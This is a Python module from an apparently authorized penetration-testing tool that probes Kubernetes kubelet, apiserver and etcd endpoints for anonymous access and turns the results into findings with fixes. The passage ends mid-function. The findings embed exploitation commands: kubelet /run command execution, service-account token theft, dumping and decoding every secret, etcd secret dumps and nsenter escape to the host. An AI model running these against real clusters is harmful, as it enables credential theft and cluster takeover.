"""Deep Kubernetes attack-surface enumeration + vulnerability identification.

Stdlib-only HTTP(S) probes of the cluster's most dangerous network exposures:

  * **kubelet** (10250, HTTPS): an anonymous-auth kubelet answers /pods and, worse,
    exposes /exec /run - code execution inside any pod on the node (→ node, often
    cluster, compromise). The deprecated **read-only port** (10255, HTTP) leaks the
    full pod spec (env-var secrets, images) with no auth at all.
  * **kube-apiserver** (6443 / 8443 HTTPS): whether the `system:anonymous` user can
    reach the API and, critically, whether RBAC lets it LIST namespaces / secrets
    (a 200 = cluster-wide read, often game over).
  * **etcd** (2379): the cluster's backing store; unauthenticated read = every Secret
    (all service-account tokens, TLS keys) in plaintext.

Each positive read is the proof, folds into the main severity totals, the
Vulnerabilities sheet and the write-ups, and lands on a dedicated Kubernetes tab.
Airgapped, stdlib only.
"""
from __future__ import annotations

import http.client
import json
import re
import ssl

from ..core.models import Host, Port
from .svccommon import finding_builder

_TIMEOUT = 6.0
_KUBELET = 10250
_KUBELET_RO = 10255
# 6443 is the secure apiserver; 8443 is the common alt. The legacy --insecure-port
# (8080) was removed in Kubernetes 1.20, and 8080 is a very common generic-HTTP port,
# so recce only treats it as an apiserver when nmap names the service kube-apiserver
# (handled in is_k8s), never by bare port number.
_API_PORTS = (6443, 8443)
_ETCD = 2379
_K8S_PORTS = (_KUBELET, _KUBELET_RO, 6443, 8443, _ETCD)


def is_k8s(port: Port) -> bool:
    if not port.is_open:
        return False
    if port.portid in _K8S_PORTS:
        return True
    return any(k in f"{port.service} {port.product}".lower()
               for k in ("kubernetes", "kubelet", "kube-apiserver", "etcd", "k8s"))


def role(port: int) -> str:
    if port == _KUBELET:
        return "kubelet"
    if port == _KUBELET_RO:
        return "kubelet-ro"
    if port in _API_PORTS:
        return "apiserver"
    if port == _ETCD:
        return "etcd"
    return "unknown"


_READ_CAP = 16 * 1024 * 1024   # hard ceiling on a single response body (16 MB)


def _read_capped(resp, cap: int = _READ_CAP) -> bytes:
    """Read an HTTP response to EOF, bounded by `cap` (avoids OOM on a hostile body
    while still capturing multi-MB pod/secret lists that a 256 KB read truncated)."""
    chunks, total = [], 0
    while total < cap:
        chunk = resp.read(min(65536, cap - total))
        if not chunk:
            break
        chunks.append(chunk)
        total += len(chunk)
    return b"".join(chunks)


def _req(ip: str, port: int, path: str, tls: bool, method: str = "GET",
         body: str | None = None, timeout: float = _TIMEOUT):
    """Issue one request. Returns (status, parsed_json_or_text) or None."""
    conn = None
    try:
        if tls:
            conn = http.client.HTTPSConnection(
                ip, port, timeout=timeout, context=ssl._create_unverified_context())
        else:
            conn = http.client.HTTPConnection(ip, port, timeout=timeout)
        headers = {"Accept": "application/json", "User-Agent": "recce-k8s/1.0"}
        if body is not None:
            headers["Content-Type"] = "application/json"
        conn.request(method, path, body=body, headers=headers)
        resp = conn.getresponse()
        # Read to EOF up to a generous cap. A single small read() truncated a busy
        # node's /pods or the apiserver's /secrets mid-buffer, so json.loads failed
        # and the endpoint was misread as merely "reachable" (a critical exposure
        # downgraded). The str fallback below still flags a >cap body as a real list.
        raw = _read_capped(resp).decode("utf-8", "replace")
        try:
            return resp.status, json.loads(raw)
        except ValueError:
            return resp.status, raw
    except (OSError, http.client.HTTPException, ssl.SSLError, ValueError):
        return None
    finally:
        if conn is not None:
            try:
                conn.close()
            except OSError:
                pass


def _get(ip: str, port: int, path: str, tls: bool, timeout: float = _TIMEOUT):
    """GET a path. Returns (status, parsed_json_or_text) or None."""
    return _req(ip, port, path, tls, "GET", None, timeout)


def _try_get(ip, port, path, timeout):
    """GET trying TLS first then plaintext (kubelet/api are TLS; 8080/10255 plain)."""
    r = _get(ip, port, path, tls=True, timeout=timeout)
    if r is not None:
        return r, True
    r = _get(ip, port, path, tls=False, timeout=timeout)
    return (r, False) if r is not None else (None, None)


def probe(ip: str, port: int, timeout: float = _TIMEOUT) -> dict | None:
    """Role-aware unauthenticated probe. Returns a dict describing what was reachable,
    or None if the port didn't answer."""
    r = role(port)
    out = {"ip": ip, "port": port, "role": r}
    if r == "kubelet":
        pods, tls = _try_get(ip, port, "/pods", timeout)
        if pods is None:
            return None
        out["tls"] = tls
        out["anon_pods"] = pods[0] == 200 and _is_podlist(pods[1])
        out["pod_count"] = _pod_count(pods[1]) if out["anon_pods"] else None
        out["status"] = pods[0]
        # /stats/summary — resource + container metadata leak. Not
        # exec-primitive; useful for cluster-node fingerprinting.
        stats = _get(ip, port, "/stats/summary", tls=tls, timeout=timeout)
        out["anon_stats"] = bool(stats and stats[0] == 200
                                 and isinstance(stats[1], dict)
                                 and "node" in stats[1])
        # /run/{namespace}/{pod}/{container} is the exec primitive. Just
        # probing it (GET) returns 405 Method Not Allowed on modern k8s,
        # which tells us the endpoint IS routed — i.e., a POST would
        # actually exec a command inside the container. Flag the RCE
        # capability without actually invoking exec.
        if out["anon_pods"]:
            # Sample the first pod/container from /pods to construct a
            # concrete run URL; a 405 or 200 there = RCE route routed.
            body = pods[1]
            first_pod, first_ns, first_container = "", "", ""
            try:
                items = body.get("items") if isinstance(body, dict) else None
                if items and isinstance(items, list) and items:
                    p0 = items[0]
                    md = p0.get("metadata") or {}
                    first_pod = md.get("name", "")
                    first_ns = md.get("namespace", "")
                    conts = (p0.get("spec") or {}).get("containers") or []
                    if conts:
                        first_container = (conts[0] or {}).get("name", "")
            except (AttributeError, TypeError, IndexError):
                pass
            if first_pod and first_container:
                run_probe = _get(ip, port,
                                 f"/run/{first_ns}/{first_pod}/{first_container}",
                                 tls=tls, timeout=timeout)
                # 405 = route exists, wrong method. 401/403 = route exists,
                # but authz denied. Anything but 404 counts as "route present".
                out["anon_exec_route"] = bool(
                    run_probe and run_probe[0] not in (404, 0))
                out["exec_sample"] = (first_ns, first_pod, first_container)
        # /logs/ - CVE-2020-8557 (disk-fill DoS) + CVE-2024-9042 (Windows RCE
        # via parameter injection). Serves /var/log on the node as a directory
        # index. A 200 with a href listing = confirmed exposure. Passive GET.
        logs = _get(ip, port, "/logs/", tls=tls, timeout=timeout)
        if logs and logs[0] == 200:
            body = logs[1] if isinstance(logs[1], str) else ""
            out["anon_logs_dir"] = _looks_like_dir_listing(body)
        return out
    if r == "kubelet-ro":
        pods = _get(ip, port, "/pods", tls=False, timeout=timeout)
        if pods is None:
            pods = _get(ip, port, "/pods", tls=True, timeout=timeout)
        if pods is None:
            return None
        out["anon_pods"] = pods[0] == 200 and _is_podlist(pods[1])
        out["pod_count"] = _pod_count(pods[1]) if out["anon_pods"] else None
        out["status"] = pods[0]
        return out
    if r == "apiserver":
        ver, tls = _try_get(ip, port, "/version", timeout)
        if ver is None:
            return None
        out["tls"] = tls
        out["version"] = (ver[1] or {}).get("gitVersion", "") if isinstance(ver[1], dict) else ""
        # Reuse the scheme /version answered on - re-probing TLS-then-plaintext for
        # every follow-up doubles the connects (and wrong-scheme timeouts) per host.
        # Anonymous authorization: can system:anonymous LIST namespaces?
        ns = _get(ip, port, "/api/v1/namespaces", tls=tls, timeout=timeout)
        out["anon_status"] = ns[0] if ns else None
        out["anon_list"] = bool(ns and ns[0] == 200 and _is_list(ns[1]))
        if out["anon_list"]:
            sec = _get(ip, port, "/api/v1/secrets", tls=tls, timeout=timeout)
            out["anon_secrets"] = bool(sec and sec[0] == 200 and _is_list(sec[1]))
            # Additional anonymous surface: configmaps (secrets in plaintext),
            # serviceaccounts (token targets), pods (privileged/hostPath/hostPID
            # containers), clusterrolebindings (who's cluster-admin without
            # authenticating), nodes (host inventory).
            cm = _get(ip, port, "/api/v1/configmaps", tls=tls, timeout=timeout)
            out["anon_configmaps"] = bool(cm and cm[0] == 200 and _is_list(cm[1]))
            sa = _get(ip, port, "/api/v1/serviceaccounts", tls=tls, timeout=timeout)
            out["anon_serviceaccounts"] = bool(sa and sa[0] == 200 and _is_list(sa[1]))
            nd = _get(ip, port, "/api/v1/nodes", tls=tls, timeout=timeout)
            out["anon_nodes"] = bool(nd and nd[0] == 200 and _is_list(nd[1]))
            crb = _get(ip, port,
                       "/apis/rbac.authorization.k8s.io/v1/clusterrolebindings",
                       tls=tls, timeout=timeout)
            out["anon_clusterrolebindings"] = bool(
                crb and crb[0] == 200 and _is_list(crb[1]))
            # Pods listing: check for privileged / hostPath / hostNetwork /
            # hostPID containers. Each is a straight route to node compromise
            # from inside the pod, so we surface the count separately.
            pods = _get(ip, port, "/api/v1/pods", tls=tls, timeout=timeout)
            if pods and pods[0] == 200 and isinstance(pods[1], dict):
                privileged = host_mounts = host_pid = host_net = 0
                items = pods[1].get("items") or []
                for pod in items[:200]:      # cap for large clusters
                    spec = pod.get("spec") or {}
                    if spec.get("hostNetwork"): host_net += 1
                    if spec.get("hostPID"): host_pid += 1
                    for c in spec.get("containers") or []:
                        sc = (c.get("securityContext") or {})
                        if sc.get("privileged"): privileged += 1
                    for v in spec.get("volumes") or []:
                        if isinstance(v, dict) and v.get("hostPath"):
                            host_mounts += 1
                            break
                out["escape_pod_counts"] = {
                    "privileged": privileged, "hostPath": host_mounts,
                    "hostPID": host_pid, "hostNetwork": host_net}
            # T2 SAFE proof-of-exploit: only fires when we've established that
            # anon LIST works (the /api/v1/namespaces 200 above). Single
            # controlled bounded read of /api/v1/pods?limit=10 — server-side
            # cap keeps the response tiny, we record a handful of pod
            # names/namespaces/images as real live evidence that anon reads
            # cross the RBAC boundary. Non-destructive (GET, read-only,
            # server-side limit), single-shot, capped timeout. Kept distinct
            # from the full /api/v1/pods read above (which counts escape
            # configurations across up to 200 pods) — this one is the
            # evidence-preserving canary that lands in the finding detail.
            ev = _probe_pods_canary(ip, port, tls,
                                    timeout=min(timeout, 5.0))
            if ev is not None:
                out["pods_evidence"] = ev
        # SelfSubjectRulesReview - one POST answers definitively what verbs the
        # anonymous user actually holds on this cluster; catches create/exec/
        # impersonate perms the LIST-only enumeration above misses. Probed
        # whenever the apiserver is answering anon at all (200 list OR 403).
        if out.get("anon_list") or out.get("anon_status") in (401, 403):
            ssrr_body = ('{"kind":"SelfSubjectRulesReview","apiVersion":'
                         '"authorization.k8s.io/v1","spec":'
                         '{"namespace":"default"}}')
            ssrr = _req(ip, port,
                        "/apis/authorization.k8s.io/v1/selfsubjectrulesreview",
                        tls, "POST", ssrr_body, timeout)
            if ssrr and ssrr[0] in (200, 201) and isinstance(ssrr[1], dict):
                st = (ssrr[1].get("status") or {})
                rules = st.get("resourceRules") or []
                nonres = st.get("nonResourceRules") or []
                verbs: set[str] = set()
                for rule in rules:
                    for v in (rule.get("verbs") or []):
                        if isinstance(v, str):
                            verbs.add(v)
                out["anon_ssrr_rules"] = len(rules) + len(nonres)
                out["anon_ssrr_verbs"] = sorted(verbs)
        return out
    if r == "etcd":
        ver, tls = _try_get(ip, port, "/version", timeout)
        if ver is None:
            return None
        out["tls"] = tls
        out["etcd_version"] = _etcd_version(ver[1])
        # v2 keys API (disabled by default since etcd 3.4, but still seen on older
        # clusters). Reuse the scheme /version answered on (etcd serves both over it).
        keys = _get(ip, port, "/v2/keys/?recursive=true", tls=tls, timeout=timeout)
        out["v2_readable"] = bool(keys and keys[0] == 200
                                  and isinstance(keys[1], dict) and "node" in keys[1])
        # v3 gRPC-gateway (what every modern Kubernetes ships): an unauthenticated
        # maintenance/status read = no client-cert-auth = the whole store is readable.
        v3 = _req(ip, port, "/v3/maintenance/status", tls, "POST", "{}", timeout)
        if v3 is None:
            v3 = _req(ip, port, "/v3/maintenance/status", not tls, "POST", "{}", timeout)
        out["v3_readable"] = bool(v3 and v3[0] == 200 and isinstance(v3[1], dict)
                                  and ("version" in v3[1] or "dbSize" in v3[1]
                                       or "header" in v3[1]))
        return out
    return None


def _probe_pods_canary(ip: str, port: int, tls: bool,
                       timeout: float = 5.0) -> dict | None:
    """T2 SAFE proof-of-exploit: bounded GET /api/v1/pods?limit=10.

    Returns a compact evidence dict — pod count plus namespace/name/image
    triples for the first few pods on the live cluster — proving that
    anonymous LIST returns real workload state (beyond the kind/items shape
    check on /api/v1/namespaces). Non-destructive: read-only endpoint, no
    writes, no state change. Bounded: single HTTP request, server-side
    ?limit=10 cap, bounded response reader, capped timeout, at most five
    pod entries recorded.

    Returns None on any failure (no upgrade — caller keeps T1)."""
    r = _get(ip, port, "/api/v1/pods?limit=10", tls=tls, timeout=timeout)
    if r is None:
        return None
    status, body = r
    if status != 200 or not isinstance(body, dict):
        return None
    items = body.get("items")
    if not isinstance(items, list) or not items:
        return None
    sample: list[dict] = []
    for pod in items[:5]:
        if not isinstance(pod, dict):
            continue
        md = pod.get("metadata") or {}
        spec = pod.get("spec") or {}
        conts = spec.get("containers") or []
        images: list[str] = []
        for c in conts[:3]:
            if isinstance(c, dict):
                img = c.get("image")
                if isinstance(img, str) and img:
                    images.append(img[:120])
        sample.append({
            "namespace": str(md.get("namespace", ""))[:80],
            "name": str(md.get("name", ""))[:120],
            "images": images,
        })
    if not sample:
        return None
    return {"count": len(items), "sample": sample,
            "endpoint": "/api/v1/pods?limit=10"}


def _is_podlist(body) -> bool:
    if isinstance(body, dict):
        return body.get("kind") == "PodList" or isinstance(body.get("items"), list)
    if isinstance(body, str):     # oversized/truncated JSON still proves exposure
        b = body.replace(" ", "")
        return '"kind":"PodList"' in b or '"items"' in b
    return False


def _pod_count(body) -> int | None:
    if isinstance(body, dict) and isinstance(body.get("items"), list):
        return len(body["items"])
    return None


def _is_list(body) -> bool:
    if isinstance(body, dict):
        return (str(body.get("kind", "")).endswith("List")
                or isinstance(body.get("items"), list))
    if isinstance(body, str):     # oversized/truncated JSON still proves exposure
        b = body.replace(" ", "")
        return '"items"' in b or bool(re.search(r'"kind":"\w+List"', b))
    return False


def _looks_like_dir_listing(body: str) -> bool:
    if not isinstance(body, str) or not body:
        return False
    s = body[:8192].lower()
    if "index of" in s or "directory listing" in s:
        return True
    return "<a href=" in s and (".log" in s or "/</a>" in s)


_SSRR_DANGEROUS = frozenset({"*", "create", "update", "patch", "delete",
                             "deletecollection", "impersonate"})


def _etcd_version(body) -> str:
    if isinstance(body, dict):
        return body.get("etcdserver", "") or body.get("etcdcluster", "")
    if isinstance(body, str):
        return body.strip()[:40]
    return ""


def k8s_targets(hosts: list[Host]) -> list[dict]:
    out = []
    for h in hosts:
        for p in h.open_ports:
            if is_k8s(p):
                out.append({"ip": h.ip, "hostname": h.hostname, "port": p.portid,
                            "role": role(p.portid), "product": p.product or ""})
    return out


# --- narratives -----------------------------------------------------------------

_NARRATIVE = {
    "kubelet_anon": (
        "The kubelet is the per-node agent that runs containers, and this one answers "
        "unauthenticated. Beyond listing every pod on the node (names, namespaces, "
        "images, and the env-var secrets in the spec), an anonymous kubelet exposes "
        "the /exec, /run and /attach endpoints - remote command execution INSIDE any "
        "container on the node. From a shell in a pod an attacker reads that pod's "
        "mounted service-account token and calls the API server as it; a token with "
        "any meaningful RBAC (or a privileged/hostPath pod on the node) escalates to "
        "the node and frequently the whole cluster. This is one of the highest-impact "
        "Kubernetes misconfigurations."),
    "kubelet_ro": (
        "The kubelet read-only port (10255) serves the full pod spec over plain HTTP "
        "with no authentication. It leaks every pod's images, command lines and - "
        "critically - the environment variables, which routinely hold database "
        "passwords, API keys and cloud credentials. It is pure reconnaissance, but "
        "it habitually hands over the secrets needed for the next hop."),
    "api_anon_list": (
        "The kube-apiserver allows the unauthenticated system:anonymous user to LIST "
        "cluster resources - recce read them with no token. If it can list Secrets, "
        "that is every service-account token and TLS key in the cluster, i.e. full "
        "cluster compromise. Even namespace/pod listing is a serious RBAC failure that "
        "maps the cluster and often exposes a path to a privileged binding."),
    "api_anon_open": (
        "The kube-apiserver accepts anonymous requests (system:anonymous is enabled). "
        "Listing was refused by RBAC here, but anonymous-auth being on is the "
        "precondition for every RBAC-misconfiguration and CVE that grants the "
        "anonymous user access - it should be disabled (--anonymous-auth=false)."),
    "kubelet_logs_dir": (
        "The kubelet /logs/ endpoint serves the node's /var/log directory over "
        "HTTP with no authentication. On Linux this is CVE-2020-8557 (a disk-fill "
        "DoS by streaming huge log files, and immediate disclosure of every "
        "container's stdout/stderr on the node). On Windows kubelets it is "
        "CVE-2024-9042 - parameter injection in this same endpoint turns it into "
        "unauthenticated remote command execution on the node."),
    "api_anon_ssrr": (
        "SelfSubjectRulesReview is the apiserver's own answer to 'what can this "
        "caller do here'. Answered anonymously, it hands the tester a full, "
        "authoritative RBAC map for the system:anonymous user - including verbs "
        "that plain LIST enumeration misses (create pods, exec, impersonate, "
        "approve CSRs). If a mutating or impersonate verb appears, the anonymous "
        "user can persist inside the cluster or become another identity."),
    "etcd_open": (
        "etcd is the cluster's backing store and it answered unauthenticated. Every "
        "Kubernetes object lives here in the clear, including all Secrets - every "
        "service-account token, kubeconfig and TLS private key in the cluster. Reading "
        "etcd is equivalent to owning the cluster: impersonate any service account, "
        "mint tokens, or decrypt traffic."),
}


TESTING_NARRATIVE = [
    ("1. Unauthenticated reads (stdlib)",
     "recce issues plain HTTP(S) GETs with no token to each Kubernetes surface: the "
     "kubelet /pods (10250) and read-only /pods (10255), the kube-apiserver /version "
     "and /api/v1/namespaces (anonymous authorization), and etcd /version + /v2/keys."),
    ("2. Vulnerability identification",
     "A kubelet that returns pods anonymously -> exec RCE into pods. The read-only "
     "port -> secret-leaking pod specs. An apiserver that LISTs for system:anonymous "
     "-> RBAC failure (Secrets = cluster compromise). etcd answering -> every secret "
     "in the clear. Each folds into the main totals; the prove engine confirms it."),
    ("3. Proof",
     "recce only READS - it never execs into a pod, writes to etcd, or creates "
     "objects. The successful unauthenticated read is the proof and is captured as "
     "evidence."),
    ("4. Runbook",
     "The exact follow-on (kubeletctl exec, kubectl --insecure anonymous calls, "
     "etcdctl secret dump) is staged, to run within ROE."),
]


# --- findings -------------------------------------------------------------------

_finding = finding_builder("kubernetes", _NARRATIVE)


def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
    probes = probes or {}
    out: list[dict] = []
    for h in hosts:
        for p in h.open_ports:
            if not is_k8s(p):
                continue
            pr = probes.get((h.ip, p.portid))
            if not pr:
                continue
            tgt = f"{h.ip}:{p.portid}"
            r = pr.get("role")
            # Kubelet anon-exec route. Checked on its own rather than inside the
            # r-dispatch chain below: it surfaces even when the kubelet is TLS'd and
            # /pods is refused, as long as authorization-mode=AlwaysAllow routes
            # /run. Both this and kubelet_anon can be true on the same host.
            if r == "kubelet" and pr.get("anon_exec_route"):
                ns, pod, cont = pr.get("exec_sample") or ("<ns>", "<pod>", "<container>")
                out.append(_finding(
                    "critical",
                    "Kubelet /run exec route reachable without auth", tgt,
                    f"POST /run/{ns}/{pod}/{cont} is routed by the kubelet — "
                    f"that endpoint executes an arbitrary command inside the "
                    f"target container and returns stdout. Anonymous access "
                    f"means RCE inside every pod on this node.",
                    "curl",
                    f"curl -sk -X POST https://<ip>:{p.portid}/run/{ns}/{pod}/{cont}"
                    f" -d 'cmd=id'",
                    "Set --anonymous-auth=false AND --authorization-mode=Webhook "
                    "on the kubelet. Restrict the kubelet port to control-plane "
                    "traffic only.",
                    ["CWE-306", "CWE-77", "CWE-284"], kind="kubelet_exec",
                    exploit_note=(
                        "curl -sk -X POST https://<ip>:10250/run/<ns>/<pod>/<container> "
                        "-d 'cmd=id' — RCE inside pod, then cat "
                        "/var/run/secrets/kubernetes.io/serviceaccount/token to pivot "
                        "to apiserver."),
                    depth_tier="t1"))

            if r == "kubelet" and pr.get("anon_logs_dir"):
                out.append(_finding(
                    "critical",
                    "Kubelet /logs/ exposes node /var/log without auth", tgt,
                    "GET /logs/ returned a directory index of the node's "
                    "/var/log tree. On Linux kubelets this is CVE-2020-8557 "
                    "(disk-fill DoS + live container stdout/stderr disclosure). "
                    "On Windows kubelets CVE-2024-9042 turns the same endpoint "
                    "into unauthenticated RCE via parameter injection.",
                    "curl",
                    f"curl -sk https://<ip>:{p.portid}/logs/ ; "
                    f"curl -sk https://<ip>:{p.portid}/logs/kube-apiserver.log",
                    "Disable the /logs/ endpoint (--enable-debugging-handlers=false) "
                    "or turn off anonymous auth on the kubelet "
                    "(--anonymous-auth=false, --authorization-mode=Webhook); "
                    "patch Windows kubelets to a version that fixes CVE-2024-9042.",
                    ["CWE-22", "CWE-306", "CWE-532"], kind="kubelet_logs_dir",
                    exploit_note=(
                        "curl -sk https://<ip>:10250/logs/kube-apiserver.log — read "
                        "audit logs, extract impersonated identities and bearer "
                        "tokens; for Windows kubelets, try CVE-2024-9042 payload "
                        "(parameter injection into file path)."),
                    depth_tier="t1"))

            if r == "kubelet" and pr.get("anon_pods"):
                out.append(_finding(
                    "critical", "Kubelet allows anonymous access (exec RCE into pods)",
                    tgt, "The kubelet answered /pods unauthenticated"
                    + (f" ({pr['pod_count']} pod(s))" if pr.get("pod_count") is not None
                       else "")
                    + ".  Anonymous kubelets also expose /exec and /run - remote "
                    "command execution inside any container on the node.",
                    "kubeletctl",
                    "kubeletctl -i --server <ip> pods ; kubeletctl -i --server <ip> "
                    "exec \"id\" -p <pod> -c <container> -n <ns>   # RCE in a pod (ROE)",
                    "Set --anonymous-auth=false and --authorization-mode=Webhook on the "
                    "kubelet; firewall 10250.",
                    ["CWE-306", "CWE-284", "CWE-269"], kind="kubelet_anon",
                    exploit_note=(
                        "kubeletctl -i --server <ip> pods; kubeletctl exec 'cat "
                        "/var/run/secrets/kubernetes.io/serviceaccount/token' -p "
                        "<pod> -n <ns> — token = kubectl access. Try kubectl "
                        "--token=<X> get secrets -A."),
                    depth_tier="t1"))
            elif r == "kubelet-ro" and pr.get("anon_pods"):
                out.append(_finding(
                    "high", "Kubelet read-only port exposes pod specs (secret leak)",
                    tgt, "The kubelet read-only port served /pods over plain HTTP with "
                    "no authentication"
                    + (f" ({pr['pod_count']} pod(s))" if pr.get("pod_count") is not None
                       else "")
                    + ".  Pod specs leak images, commands and env-var secrets.",
                    "curl",
                    "curl -s http://<ip>:10255/pods | jq '.items[].spec.containers[].env'",
                    "Disable the read-only port (--read-only-port=0).",
                    ["CWE-306", "CWE-200"], kind="kubelet_ro",
                    exploit_note=(
                        "curl -s http://<ip>:10255/pods | jq -r "
                        "'.items[].spec.containers[] | .env[]? | "
                        "\"\\(.name)=\\(.value)\"' | grep -Ei 'PASS|KEY|TOKEN|URL'"),
                    depth_tier="t1"))
            elif r == "apiserver":
                if pr.get("anon_list"):
                    sec = pr.get("anon_secrets")
                    # T2 upgrade: attach concrete pod evidence to the detail
                    # when the bounded /api/v1/pods?limit=10 canary returned
                    # real live workload. Additions-only — falls back to T1
                    # if no evidence.
                    pods_ev = pr.get("pods_evidence") or {}
                    proof_tier = "t2" if pods_ev else "t1"
                    proof_line = ""
                    if pods_ev:
                        sample = pods_ev.get("sample") or []
                        pod_bits: list[str] = []
                        for m in sample[:3]:
                            imgs = m.get("images") or []
                            img_bit = imgs[0] if imgs else "?"
                            pod_bits.append(
                                f"{m.get('namespace','?')}/"
                                f"{m.get('name','?')} ({img_bit})")
                        proof_line = (
                            f"  T2 proof — GET {pods_ev.get('endpoint','?')} "
                            f"returned {pods_ev.get('count','?')} live pod(s): "
                            + "; ".join(pod_bits)
                            + ("…" if len(sample) > 3 else "") + ".")
                    out.append(_finding(
                        "critical" if sec else "high",
                        "Kubernetes API allows anonymous resource listing"
                        + (" incl. Secrets" if sec else ""),
                        tgt, "The kube-apiserver returned 200 to an unauthenticated "
                        "(system:anonymous) LIST of namespaces"
                        + (" AND secrets - every service-account token and TLS key is "
                           "readable (cluster compromise)" if sec
                           else " - a serious RBAC misconfiguration")
                        + f".  Server: {pr.get('version', '?')}."
                        + proof_line,
                        "kubectl",
                        "kubectl --server https://<ip>:<port> --insecure-skip-tls-verify "
                        "get secrets -A -o yaml   # dump every secret (ROE)",
                        "Never bind roles to system:anonymous / system:unauthenticated; "
                        "set --anonymous-auth=false.",
                        ["CWE-306", "CWE-284", "CWE-269"] if sec
                        else ["CWE-306", "CWE-284"], kind="api_anon_list",
                        exploit_note=(
                            "kubectl --server https://<ip>:<port> "
                            "--insecure-skip-tls-verify get secrets -A -o json | jq "
                            "-r '.items[] | select(.type==\"kubernetes.io/"
                            "service-account-token\") | .data.token' | base64 -d — "
                            "use each token as a bearer for further kubectl calls."),
                        depth_tier=proof_tier))
                    # Additional anonymous-readable resources on the apiserver.
                    extra_reads = []
                    if pr.get("anon_configmaps"): extra_reads.append("configmaps (often store secrets in plaintext)")
                    if pr.get("anon_serviceaccounts"): extra_reads.append("serviceaccounts (token pivot targets)")
                    if pr.get("anon_nodes"): extra_reads.append("nodes (host inventory)")
                    if pr.get("anon_clusterrolebindings"): extra_reads.append("clusterrolebindings (RBAC map)")
                    if extra_reads:
                        out.append(_finding(
                            "high",
                            "Kubernetes API leaks additional resources unauth", tgt,
                            f"Beyond namespaces/secrets, anonymous auth also reads: "
                            f"{', '.join(extra_reads)}. Combined with the primary "
                            f"anon-list finding, this maps the entire cluster's "
                            f"RBAC + workload + token surface for the tester.",
                            "kubectl",
                            "kubectl --server https://<ip>:<port> --insecure-skip-tls-verify "
                            "get configmaps,serviceaccounts,clusterrolebindings -A -o yaml",
                            "Same fix — remove all bindings for system:anonymous; "
                            "set --anonymous-auth=false.",
                            ["CWE-200", "CWE-284"], kind="api_anon_resources",
                            exploit_note=(
                                "kubectl ... get clusterrolebindings -o json | jq "
                                "'.items[] | select(.subjects[]?.name==\""
                                "system:anonymous\")' — any hit = the anonymous user "
                                "IS cluster-admin. kubectl get configmaps -A -o yaml "
                                "| grep -Ei 'password|token|api_key'"),
                            depth_tier="t1"))
                    # Escape-route pod counts.
                    ec = pr.get("escape_pod_counts") or {}
                    if any(ec.get(k, 0) > 0 for k in ("privileged", "hostPath",
                                                       "hostPID", "hostNetwork")):
                        bits = ", ".join(f"{k}={v}" for k, v in ec.items() if v > 0)
                        out.append(_finding(
                            "critical",
                            "Kubernetes pods with node-escape configuration", tgt,
                            f"Pods listed via anonymous API include node-escape-capable "
                            f"specs: {bits}. Any of these (privileged, hostPath mount, "
                            f"hostPID, hostNetwork) is a direct route to the host node "
                            f"from inside the pod. Combined with the anon-exec route on "
                            f"the kubelet, this is full cluster + node compromise.",
                            "kubectl",
                            "kubectl --server https://<ip>:<port> get pods -A "
                            "-o jsonpath='{range .items[?(@.spec.hostPID==true)]}{.metadata.name}{\"\\n\"}{end}'",
                            "Apply Pod Security Admission (baseline or restricted) to "
                            "every namespace; deny hostPath, hostPID, privileged in "
                            "PodSecurity policy.",
                            ["CWE-269", "CWE-284"], kind="k8s_escape_pods",
                            exploit_note=(
                                "kubectl --server https://<ip>:<port> get pods -A -o "
                                "json | jq -r '.items[] | select(.spec.hostPID==true "
                                "or (.spec.containers[]?.securityContext.privileged"
                                "==true)) | \"\\(.metadata.namespace)/\\(.metadata."
                                "name)\"'; then via kubelet exec: nsenter -t 1 -m -u "
                                "-i -n -p sh."),
                            depth_tier="t1"))
                # NOTE: this used to be `elif`, chained to a `r == "kubelet"` test
                # that sat inside this `elif r == "apiserver"` branch and could
                # therefore never be true. The dead test is gone (moved to the
                # kubelet branch above); promoting this to `if` keeps the behaviour
                # it already had, since the condition it chained from was constant.
                if pr.get("anon_status") == 403:
                    out.append(_finding(
                        "low", "Kubernetes API accepts anonymous requests", tgt,
                        "The kube-apiserver processes unauthenticated requests "
                        "(system:anonymous is enabled); RBAC refused the list here "
                        f"(403), but anonymous-auth is on.  Server: {pr.get('version', '?')}.",
                        "kubectl",
                        "kubectl --server https://<ip>:<port> --insecure-skip-tls-verify "
                        "auth can-i --list --as=system:anonymous",
                        "Disable anonymous auth (--anonymous-auth=false) unless a health "
                        "endpoint requires it.",
                        ["CWE-306"], kind="api_anon_open",
                        exploit_note=(
                            "kubectl --server https://<ip>:<port> "
                            "--insecure-skip-tls-verify auth can-i --list "
                            "--as=system:anonymous — enumerate verbs anon holds."),
                        depth_tier="t0"))
                if pr.get("anon_ssrr_rules"):
                    verbs = pr.get("anon_ssrr_verbs") or []
                    dangerous = sorted(v for v in verbs if v in _SSRR_DANGEROUS)
                    sev = "critical" if dangerous else "high"
                    vsummary = (f"including mutating verbs {', '.join(dangerous)}"
                                if dangerous
                                else f"read-only verbs ({', '.join(verbs) or 'get/list/watch'})")
                    out.append(_finding(
                        sev,
                        "Kubernetes API leaks anon RBAC via SelfSubjectRulesReview",
                        tgt,
                        f"POST /apis/authorization.k8s.io/v1/selfsubjectrulesreview "
                        f"returned {pr['anon_ssrr_rules']} rule(s) bound to "
                        f"system:anonymous, {vsummary}. This is the apiserver's "
                        f"own authoritative statement of what the anonymous user "
                        f"can do here - any mutating verb (create, patch, delete, "
                        f"impersonate, *) is a direct route to persistence or "
                        f"privilege escalation.",
                        "kubectl",
                        "kubectl --server https://<ip>:<port> --insecure-skip-tls-verify "
                        "auth can-i --list --as=system:anonymous -n default",
                        "Remove every ClusterRoleBinding / RoleBinding that names "
                        "system:anonymous or system:unauthenticated; set "
                        "--anonymous-auth=false on the apiserver.",
                        ["CWE-306", "CWE-284"] + (["CWE-269"] if dangerous else []),
                        kind="api_anon_ssrr",
                        exploit_note=(
                            "If mutating verbs present: kubectl --server ... "
                            "--as=system:anonymous create -f privileged-pod.yaml; "
                            "else focus on the read verbs already covered by "
                            "api_anon_list."),
                        depth_tier="t1"))
            elif r == "etcd" and (pr.get("v2_readable") or pr.get("v3_readable")):
                api = "v2 keys" if pr.get("v2_readable") else "v3 gRPC-gateway"
                out.append(_finding(
                    "critical", "etcd exposed unauthenticated (all cluster secrets)",
                    tgt, f"etcd answered an unauthenticated read via its {api} API. etcd "
                    "holds every Kubernetes object in the clear, including all Secrets "
                    "(service-account tokens, TLS keys).  Version: "
                    f"{pr.get('etcd_version', '?')}.",
                    "etcdctl",
                    "ETCDCTL_API=3 etcdctl --endpoints <ip>:2379 get / --prefix --keys-only "
                    "; ... get /registry/secrets/... (dump secrets - ROE)",
